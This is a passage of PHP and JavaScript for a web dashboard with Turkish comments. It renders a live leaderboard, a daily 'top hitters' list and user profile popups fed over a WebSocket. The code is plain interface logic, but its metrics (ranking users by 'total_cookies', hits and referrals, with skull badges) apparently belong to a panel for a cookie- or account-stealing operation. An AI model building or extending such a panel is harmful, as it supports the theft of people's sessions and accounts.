Z M 11 13 C 9.894531 13 9 13.894531 9 15 C 9 16.105469 9.894531 17 11 17 C 12.105469 17 13 16.105469 13 15 C 13 13.894531 12.105469 13 11 13 Z M 16 15 C 15.449219 15 15 15.449219 15 16 C 15 16.550781 15.449219 17 16 17 C 16.550781 17 17 16.550781 17 16 C 17 15.449219 16.550781 15 16 15 Z M 12.5 19 C 11.671875 19 11 19.671875 11 20.5 C 11 21.328125 11.671875 22 12.5 22 C 13.328125 22 14 21.328125 14 20.5 C 14 19.671875 13.328125 19 12.5 19 Z M 19.5 20 C 18.671875 20 18 20.671875 18 21.5 C 18 22.328125 18.671875 23 19.5 23 C 20.328125 23 21 22.328125 21 21.5 C 21 20.671875 20.328125 20 19.5 20 Z"/></svg><?=number_format($u['total_cookies'], 0, '.', ' ')?></div>
            </div>
            <?php endforeach; ?>
        <?php else: ?>
            <div class="no-data">No leaderboard data available</div>
        <?php endif; ?>
    </div>
</div>

<?php if(!$isTriplehook): ?>
<?php
    $tzResult = dashWidgetQuery("SELECT TIMESTAMPDIFF(SECOND, NOW(), DATE_ADD(CURDATE(), INTERVAL 1 DAY)) as secs_left", []);
    $serverSecondsUntilMidnight = (int)($tzResult[0]['secs_left'] ?? 0);
?>
<script>
(function(){
    var serverSecondsLeft=<?= (int)$serverSecondsUntilMidnight ?>;
    var pageLoadTime=Math.floor(Date.now()/1000);
    function getSecondsUntilMidnight(){var elapsed=Math.floor(Date.now()/1000)-pageLoadTime;var remaining=serverSecondsLeft-elapsed;return remaining>0?remaining:0;}
    var countdown=getSecondsUntilMidnight();
    var timer=null;
    function formatTime(sec){var h=Math.floor(sec/3600);var m=Math.floor((sec%3600)/60);var s=sec%60;return (h>0?h+'h ':'')+(m>0?m+'m ':'')+s+'s';}
    window.toggleTodayPopup=function(){var popup=document.getElementById('todayPopup');var btn=document.getElementById('todayBtn');var isOpen=popup.classList.contains('show');if(isOpen){closeTodayPopup();}else{popup.classList.remove('hiding');popup.classList.add('show');btn.classList.add('active');startCountdown();}};
    window.closeTodayPopup=function(){var popup=document.getElementById('todayPopup');var btn=document.getElementById('todayBtn');if(!popup.classList.contains('show'))return;popup.classList.remove('show');popup.classList.add('hiding');btn.classList.remove('active');popup.addEventListener('animationend',function handler(){popup.classList.remove('hiding');popup.removeEventListener('animationend',handler);});if(timer)clearInterval(timer);};
    function startCountdown(){countdown=getSecondsUntilMidnight();updateCountdownDisplay();if(timer)clearInterval(timer);timer=setInterval(function(){countdown--;updateCountdownDisplay();if(countdown<=0){countdown=getSecondsUntilMidnight();location.reload();}},1000);}
    function updateCountdownDisplay(){var el=document.getElementById('todayCountdown');if(el)el.textContent=formatTime(countdown);}
    document.addEventListener('keydown',function(e){if(e.key==='Escape'){closeTodayPopup();closeProfileModal();}});
    document.getElementById('todayPopup').addEventListener('click',function(e){e.stopPropagation();});
    setTimeout(function(){toggleTodayPopup();},100);
})();
</script>
<?php endif; ?>
<script>
function openProfileModal(linkId,mode){if(!linkId)return;mode=mode||'normal';var overlay=document.getElementById('profileModalOverlay');var content=document.getElementById('profileModalContent');if(!overlay||!content)return;content.innerHTML='<div class="profile-modal-loading">Loading...</div>';overlay.classList.add('show');fetch('/api/user-profile.php?link_id='+encodeURIComponent(linkId)+'&mode='+encodeURIComponent(mode)).then(function(r){return r.json()}).then(function(d){if(!d.success){content.innerHTML='<div class="profile-modal-loading">User not found</div>';return}var u=d.user;var av=u.avatar?'<img src="'+u.avatar+'" class="profile-modal-avatar" alt="">':'<div class="profile-modal-avatar-placeholder"><i class="fab fa-discord"></i></div>';var pct=u.rank_percent||0;var nxt=u.is_max_rank?'<div class="profile-rank-next"><span>MAX RANK</span></div>':'<div class="profile-rank-next">Next: → <span>'+_e(u.next_rank)+'</span></div>';content.innerHTML='<div class="profile-modal-header">'+av+'<div class="profile-modal-name" data-n="'+_a(u.username)+'"></div></div><div class="profile-modal-body"><div><div class="profile-modal-section-title">Weekly Stats</div><div class="profile-modal-stats"><div class="profile-stat-row"><span class="profile-stat-label">HITS</span><span class="profile-stat-dots"></span><span class="profile-stat-value">'+_f(u.weekly_hits)+'</span></div><div class="profile-stat-row"><span class="profile-stat-label">VISITS</span><span class="profile-stat-dots"></span><span class="profile-stat-value">'+_f(u.weekly_visits)+'</span></div><div class="profile-stat-row"><span class="profile-stat-label">CLICKS</span><span class="profile-stat-dots"></span><span class="profile-stat-value">'+_f(u.weekly_clicks)+'</span></div></div></div><div><div class="profile-modal-section-title">Current Rank</div><div class="profile-rank-current"><span class="label">CURRENT RANK</span><span class="arrow">→</span><span class="value">'+_e(u.current_rank)+'</span></div><div class="profile-rank-progress"><div class="profile-rank-percent"><span>'+pct+'%</span> to next rank</div><div class="profile-rank-bar"><div class="profile-rank-bar-fill" style="width:'+pct+'%"></div></div></div>'+nxt+'</div></div>';}).catch(function(){content.innerHTML='<div class="profile-modal-loading">Error loading profile</div>'});}
function closeProfileModal(){document.getElementById('profileModalOverlay').classList.remove('show')}
function _e(t){var d=document.createElement('div');d.textContent=t||'';return d.innerHTML}
function _a(t){var d=document.createElement('div');d.textContent=t||'';return d.innerHTML.replace(/"/g,'&quot;')}
function _f(n){n=parseInt(n)||0;return n.toString().replace(/\B(?=(\d{3})+(?!\d))/g,' ')}
document.addEventListener('keydown',function(e){if(e.key==='Escape')closeProfileModal()});
</script>

<script>
(function(){
    // Şifreleme/çözme paylaşımlı istemcide (window.ultimaWS) yapılıyor.
    function esc(t){var d=document.createElement('div');d.textContent=t==null?'':String(t);return d.innerHTML}
    function escAttr(t){return esc(t).replace(/"/g,'&quot;')}
    function fmt(n){n=parseInt(n)||0;return n.toString().replace(/\B(?=(\d{3})+(?!\d))/g,' ')}

    function getAvatarUrl(avatar, discordId){
        if(!avatar)return '';
        if(avatar.indexOf('http')===0)return avatar;
        if(avatar.indexOf('/images/')===0)return avatar;
        if(!discordId)return '';
        var ext=avatar.indexOf('a_')===0?'gif':'png';
        return 'https://cdn.discordapp.com/avatars/'+discordId+'/'+avatar+'.'+ext;
    }

    function buildRowHTML(th, rank){
        var avatar=getAvatarUrl(th.discord_avatar||'',th.discord_id||'');
        var name=th.discord_username||'';
        var linkId=th.link_id==null?'':String(th.link_id);
        var hits=parseInt(th.today_hits)||0;
        var avatarHtml=avatar
            ? '<img src="'+escAttr(avatar)+'" class="today-row-avatar" alt="">'
            : '<div class="today-row-avatar-placeholder"><i class="fas fa-user"></i></div>';
        var rankBadge=rank<=3?'<span class="today-rank-badge"><i class="fas fa-skull-crossbones"></i></span>':'';
        return '<div class="today-row" data-rank="'+rank+'"'+(linkId?' data-live-link-id="'+escAttr(linkId)+'"':'')+'>'
             +   '<div class="today-row-user">'
             +     '<div class="today-row-avatar-wrap">'
             +       avatarHtml
             +       rankBadge
             +     '</div>'
             +     '<span class="today-row-name" data-n="'+escAttr(name)+'"></span>'
             +   '</div>'
             +   '<span class="today-row-hits">'+fmt(hits)+'</span>'
             + '</div>';
    }

    function applyTopHitters(rows){
        var list=document.getElementById('todayList');
        if(!list)return;
        if(!Array.isArray(rows)||rows.length===0){
            list.innerHTML='<div class="today-no-data">No hits today</div>';
            return;
        }
        var html='';
        for(var i=0;i<rows.length;i++){
            html+=buildRowHTML(rows[i],i+1);
        }
        list.innerHTML=html;
    }

    function buildLeaderboardRow(row,rank,triplehook){
        var avatar=getAvatarUrl(row.discord_avatar||'',row.discord_id||'');
        var name=row.discord_username||'';
        var linkId=row.link_id==null?'':String(row.link_id);
        var mode=triplehook?'triplehook':'normal';
        var avatarHtml=avatar
            ? '<img src="'+escAttr(avatar)+'" class="leaderboard-avatar'+(linkId?' lb-avatar-clickable':'')+'" alt=""'+(linkId?' data-profile-link="'+escAttr(linkId)+'" data-profile-mode="'+mode+'"':'')+'>'
            : '<div class="leaderboard-avatar-placeholder'+(linkId?' lb-avatar-clickable':'')+'"'+(linkId?' data-profile-link="'+escAttr(linkId)+'" data-profile-mode="'+mode+'"':'')+'><i class="fas fa-user"></i></div>';
        var score=triplehook?fmt(row.total_users):fmt(row.total_cookies);
        var scoreHtml=triplehook
            ? '<div class="leaderboard-score referrals"><i class="fas fa-users"></i>'+score+'</div>'
            : '<div class="leaderboard-score"><i class="fas fa-cookie-bite"></i>'+score+'</div>';
        return '<div class="leaderboard-row" data-rank="'+rank+'"'+(linkId?' data-live-link-id="'+escAttr(linkId)+'"':'')+'>'
             +   '<div class="leaderboard-user"><div class="lb-avatar-wrap"><span class="lb-crown"><i class="fas fa-crown"></i></span>'+avatarHtml+'</div>'
             +   '<span class="leaderboard-username" data-n="'+escAttr(name)+'"></span></div>'
             +   scoreHtml
             + '</div>';
    }

    function applyLeaderboard(rows,triplehook){
        var list=document.getElementById('leaderboardList');
        if(!list)return;
        if(!Array.isArray(rows)||rows.length===0){
            list.innerHTML='<div class="no-data">No leaderboard data available</div>';
            return;
        }
        var html='';
        for(var i=0;i<rows.length;i++)html+=buildLeaderboardRow(rows[i],i+1,triplehook);
        list.innerHTML=html;
        [].slice.call(list.querySelectorAll('[data-profile-link]')).forEach(function(el){
            el.addEventListener('click',function(){openProfileModal(el.getAttribute('data-profile-link'),el.getAttribute('data-profile-mode'));});
        });
    }

    function applyAvatarVisibilityImmediately(detail){
        if(!detail||detail.linkId==null||String(detail.linkId)==='')return;
        var linkId=String(detail.linkId);
        var name=String(detail.username||detail.discord_username||'');
        var avatar=detail.avatarUrl||detail.avatar_url||'';
        if(!name && (detail.hidden===true||detail.hidden===1||detail.hidden==='1')) name='Anonymous';
        if(!avatar && (detail.hidden===true||detail.hidden===1||detail.hidden==='1')) avatar=detail.hiddenAvatar||'https://app.ultima.cl/images/hide.png';
        [].slice.call(document.querySelectorAll('[data-live-link-id]')).forEach(function(row){
            if(row.getAttribute('data-live-link-id')!==linkId)return;
            [].slice.call(row.querySelectorAll('.today-row-name,.leaderboard-username')).forEach(function(el){el.setAttribute('data-n',name);});
            var image=row.querySelector('.today-row-avatar,.leaderboard-avatar');
            if(image&&avatar)image.src=avatar;
        });
    }
    window.addEventListener('ultima:avatar-visibility',function(event){applyAvatarVisibilityImmediately(event&&event.detail);});

    // Paylaşımlı WS istemcisi (header.php'de tanımlı window.ultimaWS) üzerinden
    // 'leaderboard' kanalına abone oluyoruz. Bağlantı yönetimi/yeniden bağlanma
    // ortak istemcide.
    function handleLeaderboardMessage(msg){
        if(!msg||!msg.type)return;
        if(msg.type==='ping')return;
        if(msg.type==='leaderboard_bundle'){
            if(Array.isArray(msg.top_hitters))applyTopHitters(msg.top_hitters);
            if(Array.isArray(msg.leaderboard))applyLeaderboard(msg.leaderboard,!!msg.triplehook);
            return;
        }
        if(msg.type==='snapshot'&&msg.rows){applyTopHitters(msg.rows);return}
        if(msg.type==='top_hitters'&&msg.rows){applyTopHitters(msg.rows);return}
        if(msg.type==='leaderboard'&&msg.rows){applyLeaderboard(msg.rows,!!msg.triplehook);return}
    }
    function init(){
        if(!window.ultimaWS||typeof window.ultimaWS.subscribe!=='function'){
            setTimeout(init,50);return;
        }
        window.ultimaWS.subscribe('leaderboard',handleLeaderboardMessage);
    }
    if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',init);
    else init();
})();
</script>
